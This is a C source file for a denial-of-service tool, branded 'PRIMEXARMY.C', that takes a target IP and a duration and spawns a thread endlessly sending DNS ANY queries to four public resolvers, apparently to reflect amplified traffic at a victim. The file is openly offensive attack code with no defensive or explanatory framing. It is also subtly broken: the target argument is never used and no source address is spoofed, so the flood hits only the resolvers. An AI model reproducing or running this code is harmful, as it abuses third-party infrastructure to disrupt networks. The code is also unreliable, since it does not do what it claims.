#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <time.h>

// Top tier resolvers from ipx.c 
const char* resolvers[] = {"8.8.8.8", "1.1.1.1", "9.9.9.9", "208.67.222.222"};

void *army_thread(void *arg) {
    char *target_ip = (char *)arg;
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    struct sockaddr_in serv;

    // DNS ANY Query Packet 
    unsigned char dns_packet[] = {
        0xab, 0xcd, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x03, 0x77, 0x77, 0x77,
        0x06, 0x67, 0x6f, 0x6f, 0x67, 0x6c, 0x65, 0x03,
        0x63, 0x6f, 0x6d, 0x00, 0x00, 0xff, 0x00, 0x01
    };

    while (1) {
        for (int i = 0; i < 4; i++) {
            serv.sin_family = AF_INET;
            serv.sin_port = htons(53);
            serv.sin_addr.s_addr = inet_addr(resolvers[i]);
            
            // Sending DNS request to resolvers 
            sendto(sock, dns_packet, sizeof(dns_packet), 0, (struct sockaddr *)&serv, sizeof(serv));
        }
    }
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc != 3) {
        printf("Usage: %s <TARGET_IP> <TIME>\n", argv[0]);
        return 1;
    }

    printf("🔥 PRIMEXARMY.C: AWS Optimized DNS Flood Online\n");

    pthread_t tid;
    pthread_create(&tid, NULL, army_thread, argv[1]);
    
    sleep(atoi(argv[2]));
    printf("💀 Mission Accomplished.\n");
    return 0;
}